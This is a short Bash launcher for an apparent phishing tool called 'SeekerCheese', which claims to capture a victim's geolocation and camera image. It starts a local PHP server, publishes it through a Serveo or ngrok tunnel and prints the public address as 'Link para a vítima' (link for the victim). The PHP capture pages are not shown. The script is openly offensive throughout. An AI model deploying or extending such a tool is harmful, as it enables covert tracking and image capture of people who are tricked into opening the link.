#!/bin/bash

# Banner
echo "SeekerCheese - Captura Geolocalização e Imagem"

# Iniciar servidor PHP
echo "[+] Iniciando servidor PHP em localhost:3333"
php -S 127.0.0.1:3333 > /dev/null 2>&1 &

# Escolher entre Ngrok ou Serveo
echo "[1] Serveo.net"
echo "[2] Ngrok"
read -p "[+] Escolha o método de tunelamento: " option

if [ "$option" -eq 1 ]; then
    echo "[+] Usando Serveo.net..."
    ssh -R 80:localhost:3333 serveo.net > sendlink &
    sleep 5
    link=$(grep -o "https://[0-9a-z]*\.serveo.net" sendlink)
elif [ "$option" -eq 2 ]; then
    if ! command -v ngrok > /dev/null; then
        echo "[!] Ngrok não está instalado. Instalando Ngrok..."
        wget https://bin.equinox.io/c/4VmDzA7iaHb/ngrok-stable-linux-amd64.zip
        unzip ngrok-stable-linux-amd64.zip
        chmod +x ngrok
    fi
    echo "[+] Usando Ngrok..."
    ./ngrok http 3333 > /dev/null 2>&1 &
    sleep 5
    link=$(curl -s -N http://127.0.0.1:4040/api/tunnels | grep -o "https://[0-9a-z]*\.ngrok.io")
else
    echo "[!] Opção inválida!"
    exit 1
fi

echo "[+] Link para a vítima: $link"
echo "[+] Aguardando vítima..."